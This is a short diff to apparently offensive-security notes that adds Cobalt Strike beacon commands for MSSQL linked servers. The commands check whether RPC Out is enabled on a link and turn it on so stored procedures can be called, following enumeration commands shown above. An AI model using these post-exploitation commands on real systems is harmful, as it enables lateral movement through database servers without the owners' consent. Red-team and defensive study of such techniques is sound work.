@@ -104,3 +104,10 @@ beacon> sql-query $HOSTNAME "SELECT @@SERVERNAME" "" $LINKED_SERVER_HOSTNAME
 # Enumerate linked servers
 beacon> sql-whoami $HOSTNAME "" $LINKED_SERVER_HOSTNAME
 ```
+
+```shell
+#  However, this will fail if RPC Out is not enabled on the link,
+# as it's required in order to call stored procedures on the linked server.
+beacon> sql-checkrpc $HOSTNAME
+beacon> sql-enablerpc $HOSTNAME $LINKED_SERVER_HOSTNAME
+```
